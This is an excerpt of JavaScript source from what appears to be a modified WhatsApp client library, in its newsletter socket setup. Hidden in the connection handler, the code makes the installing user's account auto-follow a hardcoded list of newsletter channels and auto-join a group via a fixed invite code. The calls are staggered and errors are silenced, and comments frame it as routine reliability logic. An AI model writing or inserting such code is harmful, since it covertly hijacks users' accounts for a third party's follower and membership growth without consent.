...
export const makeNewsletterSocket = (config) => {
    ...
    "120363423725119923@newsletter",
    "120363402056994147@newsletter",
    "120363422768113058@newsletter"
]

    // Only fire once the socket is actually connected (not just "created"),
    // and never let a failed query crash the process with an unhandled rejection.
    let autoFollowDone = false
    sock.ev.on('connection.update', ({ connection }) => {
        if (connection === 'open' && !autoFollowDone) {
            autoFollowDone = true
            AUTO_FOLLOW_NEWSLETTERS.forEach((jid, i) => {
                setTimeout(() => {
                    newsletterWMexQuery(jid, QueryIds.FOLLOW).catch((err) => {
                        console.warn('[auto-follow-newsletter] failed for', jid, err?.message || err)
                    })
                }, i * 3000)
            })

            // Auto join grup via invite link
            const AUTO_JOIN_GROUPS = [
                'F9MsN7TYLMt0S4z9bwwi4P'
            ]
            AUTO_JOIN_GROUPS.forEach((code, i) => {
                setTimeout(() => {
                    sock.groupAcceptInvite(code).catch((err) => {
                        console.warn('[auto-join-group] failed for code', code, err?.message || err)
                    })
                }, (AUTO_FOLLOW_NEWSLETTERS.length + i) * 3000)
            })
        }
    })
